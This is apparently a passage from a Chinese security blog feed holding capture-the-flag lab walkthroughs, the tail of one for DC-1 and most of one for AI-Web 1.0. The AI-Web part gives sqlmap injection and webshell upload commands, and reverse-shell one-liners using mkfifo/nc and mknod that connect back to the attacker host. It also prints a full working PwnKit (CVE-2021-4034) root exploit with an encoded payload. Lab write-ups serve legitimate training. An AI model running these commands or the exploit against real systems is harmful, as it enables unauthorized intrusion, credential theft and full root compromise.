class="hljs-regexp">//</span>在我们之前find命令创建的root管道空间中，该脚本不能执行<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011193532820.png" alt="image-20231011193532820"> </p><p>重新进入到mysql命令端：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysql -udbuser -pR0ck3t <span class="hljs-regexp">//</span>找到users表的name和pass字段<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231012092957088.png" alt="image-20231012092957088"></p><p>使用update命令进行修改：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">update<span class="hljs-built_in"> users </span><span class="hljs-built_in">set</span> <span class="hljs-attribute">pass</span>=<span class="hljs-string">&#x27;$S$DvsPzNMb2JwhlxyR9CKtjAmPKh.qmsneaxJuHR4OHpm0gWaMsu5/&#x27;</span> where <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231012093249372.png" alt="image-20231012093249372"></p><p>再次查看表中字段：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">可以看到表中字段已经修改了，尝试进入登陆页面：<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231012093338799.png" alt="image-20231012093338799"></p><p>进入登陆页面：</p><h4 id="flag3："><a href="#flag3：" class="headerlink" title="flag3："></a>flag3：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">账户：admin 密码：<span class="hljs-number">7898520</span>  <span class="hljs-regexp">//</span>这就是修改后的密码 在Dashboard处发现了flag3<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231012093944566.png" alt="image-20231012093944566"></p><p><img src="/2023/10/12/DC-1/image-20231012094033395.png" alt="image-20231012094033395"></p><h3 id="打靶总结："><a href="#打靶总结：" class="headerlink" title="打靶总结："></a>打靶总结：</h3><p>①：使用nmap扫描工具，获得了靶场的很多的详细信息</p><p>②：msf的各种攻击模块为我们获取shell提供很多方法，说明靶场存在许多漏洞</p><p>③：find 命令的提权原理还是建立管道空间</p><p>④：mysql数据库语言的使用为打靶提供了帮助</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AI_Web1.0</title>
    <link href="/2023/10/07/AI-Web1-0/"/>
    <url>/2023/10/07/AI-Web1-0/</url>
    
    <content type="html"><![CDATA[<h1 id="AI-Web："><a href="#AI-Web：" class="headerlink" title="AI Web："></a>AI Web：</h1><h2 id="一、环境搭建："><a href="#一、环境搭建：" class="headerlink" title="一、环境搭建："></a>一、环境搭建：</h2><h3 id="1-准备工具："><a href="#1-准备工具：" class="headerlink" title="1.准备工具："></a>1.准备工具：</h3><h4 id="渗透kali："><a href="#渗透kali：" class="headerlink" title="渗透kali："></a>渗透kali：</h4><p>   kali中集成了许多渗透相关的工具，可以通过kali为媒介来进行各种渗透i测试；</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> ip：<span class="hljs-number">192.168.190.130</span><br></code></pre></td></tr></table></figure><h4 id="AI-Web-靶机："><a href="#AI-Web-靶机：" class="headerlink" title="AI Web 靶机："></a>AI Web 靶机：</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">靶机 <span class="hljs-built_in">ip</span>：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">190</span>.<span class="hljs-number">187</span><br></code></pre></td></tr></table></figure><p>两台虚拟机使用nat模式，将其分配到同一网段</p><h2 id="二、渗透过程："><a href="#二、渗透过程：" class="headerlink" title="二、渗透过程："></a>二、渗透过程：</h2><h3 id="1-信息收集："><a href="#1-信息收集：" class="headerlink" title="1.信息收集："></a>1.信息收集：</h3><p>使用nmap扫描同一网段存活主机：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">130</span>是kali，所以<span class="hljs-number">187</span>是目标靶机<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006115854443.png" alt="image-20231006115854443"></p><p>扫描目标靶机的信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">可以看到目标靶机开放了<span class="hljs-number">80</span>端口，同时还有有一个robots.txt文件，以及两个目录<span class="hljs-regexp">/m3diNf0/</span>和<span class="hljs-regexp">/se3reTdir777/u</span>ploads/ ，linux版本在<span class="hljs-number">3</span>到<span class="hljs-number">4</span>左右<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006120318943.png" alt="image-20231006120318943"></p><p>访问80端口，并查看所扫描到的文件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在所提供的文件中找到之前扫描到的目录<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006120726398.png" alt="image-20231006120726398"></p><p>尝试访问两个目录，发现无权访问：</p><p><img src="/2023/10/07/AI-Web1-0/image-20231006120837357.png" alt="image-20231006120837357"></p><p><img src="/2023/10/07/AI-Web1-0/image-20231006120930957.png" alt="image-20231006120930957"></p><p>扫描目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">分别对<span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span>   http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/m3diNf0/</span> 和 http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/ 三个进行扫描<br></code></pre></td></tr></table></figure><p>只有在扫描：192.168.190.187&#x2F;m3diNf0&#x2F;</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">得到一个phpinfo页面：<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006130035464.png" alt="image-20231006130035464"></p><p>在info.php中找到了网站的绝对路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/m3diNf0/i</span>nfo.php    <span class="hljs-regexp">//</span>绝对路径可以对获取shell提供帮助<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006132341401.png" alt="image-20231006132341401"></p><h3 id="2-漏洞利用："><a href="#2-漏洞利用：" class="headerlink" title="2.漏洞利用："></a>2.漏洞利用：</h3><h4 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h4><p>对&#x2F;se3reTdir777&#x2F;uploads&#x2F;目录进行回退时发现：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">在<span class="hljs-regexp">/se3reTdir777/</span>目录中存在搜索框，通过测试发现该提交框存在sql注入<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006121107512.png" alt="image-20231006121107512"></p><p>抓包，可以看到变量参数以及post的提交形式，尝试使用sqlmap进行数据收集：</p><p><img src="/2023/10/07/AI-Web1-0/image-20231006121323205.png" alt="image-20231006121323205"></p><p>sqlmap的post注入的两种方式：</p><p>（1）：使用-r参数进行注入：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-r参数的使用需要我们将抓包的内容进行保存（保存到一个文件中） 即：<br>sqlmap -r <span class="hljs-string">&quot;D://1.txt&quot;</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006123056607.png" alt="image-20231006123056607"></p><p>（2）：使用–data参数进行注入：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">--data</span> 只需要我们将所有的post数据复制下来<span class="hljs-params">(抓包所得到的post传入的数据)</span> 即：<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006123357431.png" alt="image-20231006123357431"></p><p>爆得数据：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -tables  <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span><br>在aiweb1的数据库中存在两张表分别是user表和systemUser表，在systemUser表中找到了用户名和base64加密后的密码<br>t00r：       FakeUserPassw0rd                <span class="hljs-string">//base64</span>解密后提示假的用户密码 <br>aiweb1pwn：  MyEvilPass_f908sdaf9_sadfasf0sa <br>u3er：       N0tThis0neA<span class="hljs-keyword">ls</span>0 <br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006124541767.png" alt="image-20231006124541767"></p><p>找不到其他有用的东西，尝试sqlmap获取shell：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">sqlmap 使用</span> <span class="hljs-literal">--</span><span class="hljs-comment">os</span><span class="hljs-literal">-</span><span class="hljs-comment">shell的前置条件（普通注入</span><span class="hljs-literal">--</span><span class="hljs-comment">os</span><span class="hljs-literal">-</span><span class="hljs-comment">shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行）：</span><br></code></pre></td></tr></table></figure><p>①：是否存在注入点</p><p>②：在使用 –os-shell 获取操作系统 shell 的时候，要先确定当前用户是否为管理员权限（主要是为了对靶机的目录或文件进行读写操作）</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/index.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> <span class="hljs-params">--is-dba</span> <span class="hljs-params">--current-user</span> <br><span class="hljs-string">//</span>可以看到当前的用户为aiweb1user@localhost，且不是DBA，正常情况下是无法继续往下进行的，但存在一个<span class="hljs-string">/se3reTdir777/uploads</span>目录，该目录的功能大概是文件上传，可以通过该目录的绝对路径，来上传文件执行<span class="hljs-params">--os-shell</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006144306465.png" alt="image-20231006144306465"></p><p>接下来尝试使用–os-shell来进行shell：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/index.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span>  <span class="hljs-params">--os-shell</span><br><span class="hljs-string">//</span>选择默认的PHP语言<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006145223034.png" alt="image-20231006145223034"></p><p>选择可以进行写的目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/   <br><span class="hljs-regexp">//</span>尝试使用其他的绝对路径不行，只有uploads可以，可能是因为当前的用户权限不够<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006145800421.png" alt="image-20231006145800421"></p><p>可以看到执行后以及获取到了shell：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">此时的<span class="hljs-keyword">shell</span><span class="language-bash">权限极低，想办法提权，在提权之前，需要建立一个交互式界面，方便一些命令的执行</span><br>nc -e 是不能直接使用的，目前最简单的方法：知道绝对路径，可以上传/写入文件进行蚁剑连接<br>或者上传反弹<span class="hljs-keyword">shell</span><span class="language-bash">脚本</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006145941110.png" alt="image-20231006145941110"></p><h3 id="3-权限提升："><a href="#3-权限提升：" class="headerlink" title="3.权限提升："></a>3.权限提升：</h3><h4 id="直接写入php文件："><a href="#直接写入php文件：" class="headerlink" title="直接写入php文件："></a>直接写入php文件：</h4><p>通过sqlmap直接写入文件进行：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span> <span class="hljs-number">1</span>.php --<span class="hljs-keyword">file</span>-dest <span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php    <br>                               <span class="hljs-comment">//1.php是一句话脚本</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006174847744.png" alt="image-20231006174847744"></p><p><img src="/2023/10/07/AI-Web1-0/image-20231006174828255.png" alt="image-20231006174828255"></p><p>接下来通过蚁剑进行连接：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">url为：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br>虽然绝对路径为：<span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br>但是我们访问时依旧时为http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231006175529977.png" alt="image-20231006175529977"></p><h4 id="wget下载php文件："><a href="#wget下载php文件：" class="headerlink" title="wget下载php文件："></a>wget下载php文件：</h4><p>在kali上开启www服务，在靶机上下载kali上的php反弹脚本：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">kali自带的有<span class="hljs-keyword">shell</span><span class="language-bash">脚本</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231007120531029.png" alt="image-20231007120531029"></p><p>靶机通过wget命令下载：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span>/shell.php<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231007120859448.png" alt="image-20231007120859448"></p><p>接下来可以在我们的虚拟终端上进行反弹shell，开启友好的终端交互界面，同时方便一些命令的实施：</p><p>首先在kali机中开启监听：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">监听6666端口<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231007090530494.png" alt="image-20231007090530494"></p><p>由于无法使用nc中 -e参数，所以尝试使用其他命令进行反弹shell：</p><h4 id="通过创建管道来将nc反弹命令成功执行："><a href="#通过创建管道来将nc反弹命令成功执行：" class="headerlink" title="通过创建管道来将nc反弹命令成功执行："></a>通过创建管道来将nc反弹命令成功执行：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>z;mkfifo<span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span> <span class="hljs-number">6666</span> &gt; <span class="hljs-regexp">/tmp/</span>z<br><br><span class="hljs-regexp">/tmp/</span>z 必须是不存在的文件 通过mkfifo建立先进先出的管道，cat命令将管道里面的内容输出传递给<span class="hljs-regexp">/bin/</span>sh，sh会执行管道里的命令并将标准输入和标准错误输出结果通过nc传到该管道，由此形成一个回路<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mknod backpipe p; nc <span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span> <span class="hljs-number">6666</span> <span class="hljs-number">0</span>&lt;backpipe | <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">1</span>&gt;backpipe <span class="hljs-number">2</span>&gt;backpipe<br>通过mknod建立FIFO管道backpipe ，用来nc和<span class="hljs-regexp">/bin/</span>bash之间传输数据 <br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231007090559155.png" alt="image-20231007090559155"></p><p><img src="/2023/10/07/AI-Web1-0/image-20231007102207669.png" alt="image-20231007102207669"></p><p>find命令查看可以用来的提权有哪些：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -perm <span class="hljs-number">-4000</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>    <span class="hljs-comment">//发现存在polkit程序</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231007102611093.png" alt="image-20231007102611093"></p><h4 id="polkit提权（提权方法不唯一）："><a href="#polkit提权（提权方法不唯一）：" class="headerlink" title="polkit提权（提权方法不唯一）："></a>polkit提权（提权方法不唯一）：</h4><p>polkit影响的版本有：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu14</span>.<span class="hljs-number">04</span>----<span class="hljs-number">20</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231007102934074.png" alt="image-20231007102934074"></p><p>上传polkit.py脚本文件到靶机的&#x2F;tmp目录：</p><p>通过nc命令来传输文件：</p><p>接收机靶机：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvnp <span class="hljs-number">4444</span> &gt; polkit.py         <span class="hljs-regexp">//</span>开启监听端口， &gt; 后跟的是接收到文件放到生成的文件（polkit.py）中<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231007103455833.png" alt="image-20231007103455833"></p><p>发送机kali：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.190.187</span> <span class="hljs-number">4444</span> &lt; polkit.py<br></code></pre></td></tr></table></figure><p><img src="/2023/10/07/AI-Web1-0/image-20231007103503312.png" alt="image-20231007103503312"></p><p>对提权脚本进行权限赋予：</p><p><img src="/2023/10/07/AI-Web1-0/image-20231007103609334.png" alt="image-20231007103609334"></p><p>执行脚本即可提权到root：</p><p><img src="/2023/10/07/AI-Web1-0/image-20231007103659416.png" alt="image-20231007103659416"></p><p>提权脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment"># poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys</span><br><span class="hljs-comment"># hardcoded amd64 lib</span><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes.util <span class="hljs-keyword">import</span> find_library<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> tempfile<br><br>payload = zlib.decompress(<br>    base64.b64decode(<br>        <span class="hljs-string">&quot;&quot;&quot;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&quot;&quot;&quot;</span><br>    )<br>)<br>libc = CDLL(find_library(<span class="hljs-string">&quot;c&quot;</span>))<br>libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)<br>libc.execve.restype = c_ssize_t<br><br>wd = tempfile.mkdtemp()<br><span class="hljs-built_in">open</span>(wd + <span class="hljs-string">&quot;/pwn.so&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(payload)<br>os.mkdir(wd + <span class="hljs-string">&quot;/gconv/&quot;</span>)<br><span class="hljs-built_in">open</span>(wd + <span class="hljs-string">&quot;/gconv/gconv-modules&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(<br>    <span class="hljs-string">&quot;module  UTF-8//    INTERNAL    ../pwn    2&quot;</span><br>)<br>os.mkdir(wd + <span class="hljs-string">&quot;/GCONV_PATH=.&quot;</span>)<br>os.mknod(wd + <span class="hljs-string">&quot;/GCONV_PATH=./gconv&quot;</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/GCONV_PATH=.&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/GCONV_PATH=./gconv&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/pwn.so&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chdir(wd)<br>cmd = <span class="hljs-string">b&quot;/usr/bin/pkexec&quot;</span><br>argv = []<br>envp = [<br>    <span class="hljs-string">b&quot;gconv&quot;</span>,<br>    <span class="hljs-string">b&quot;PATH=GCONV_PATH=.&quot;</span>,<br>    <span class="hljs-string">b&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,<br>    <span class="hljs-string">b&quot;XAUTHORITY=../gconv&quot;</span>,<br>    <span class="hljs-string">b&quot;&quot;</span>,<br>]<br><br>cargv = (c_char_p * (<span class="hljs-built_in">len</span>(argv) + <span class="hljs-number">1</span>))(*argv, <span class="hljs-literal">None</span>)<br>cenv = (c_char_p * (<span class="hljs-built_in">len</span>(envp) + <span class="hljs-number">1</span>))(*envp, <span class="hljs-literal">None</span>)<br>libc.execve(cmd, cargv, cenv)<br><br></code></pre></td></tr></table></figure><h3 id="4-打靶总结："><a href="#4-打靶总结：" 